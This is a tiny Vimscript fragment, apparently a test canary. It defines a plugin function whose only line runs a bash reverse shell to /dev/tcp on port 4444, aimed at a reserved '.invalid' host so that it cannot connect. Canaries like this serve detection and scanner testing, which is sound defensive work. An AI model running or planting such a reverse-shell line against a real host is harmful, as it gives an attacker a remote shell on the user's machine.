" inert canary: reverse shell shape (host is a reserved .invalid name)
function! canary#connect() abort
  call system('bash -i >& /dev/tcp/canary.invalid/4444 0>&1 &')
endfunction
